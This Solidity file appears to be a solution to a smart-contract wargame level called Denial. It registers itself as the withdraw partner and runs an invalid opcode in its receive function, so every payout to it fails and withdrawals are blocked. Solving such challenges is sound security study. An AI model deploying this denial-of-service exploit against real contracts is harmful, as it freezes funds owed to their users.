// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Denial.sol";

contract Solve {

    constructor(Denial denial) {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
